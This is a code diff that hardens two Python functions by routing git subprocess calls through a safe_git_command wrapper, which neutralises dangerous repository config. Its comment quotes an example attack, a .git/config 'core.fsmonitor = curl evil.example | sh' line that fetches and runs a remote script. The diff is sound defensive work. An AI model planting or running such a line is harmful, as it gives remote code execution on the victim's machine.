@@ -55,12 +55,21 @@ def extract_diff(
     timeout_s: int = DEFAULT_TIMEOUT_S,
     max_file_bytes: int | None = None,
 ) -> DiffBundle:
+    # safe_git_command injects per-invocation ``-c`` overrides
+    # (core.fsmonitor=, core.pager=cat, protocol.file.allow=user,
+    # protocol.ext.allow=never, core.hooksPath= etc.) which env vars
+    # alone CANNOT suppress because the cloned ``.git/config`` is
+    # honoured. Pre-fix this bare ``["git", "-C", ...]`` argv
+    # bypassed those defences — a hostile target repo's .git/config
+    # with ``core.fsmonitor = curl evil.example | sh`` fires on
+    # every diff. See _show_blob below (line 153) for the canonical
+    # pattern.
     completed = subprocess.run(
-        [
-            "git", "-C", str(repo_path),
+        safe_git_command(
+            "-C", str(repo_path),
             "diff", "--no-color", "--binary",
             f"{commit_before}..{commit_after}",
-        ],
+        ),
         capture_output=True,
         timeout=timeout_s,
         check=False,
@@ -200,11 +209,12 @@ def _list_files(
     after: CommitSha,
     timeout_s: int,
 ) -> list[str]:
+    # safe_git_command — see extract_diff above for the rationale.
     completed = subprocess.run(
-        [
-            "git", "-C", str(repo_path),
+        safe_git_command(
+            "-C", str(repo_path),
             "diff", "--name-only", f"{before}..{after}",
-        ],
+        ),
         capture_output=True,
         timeout=timeout_s,
         check=False,
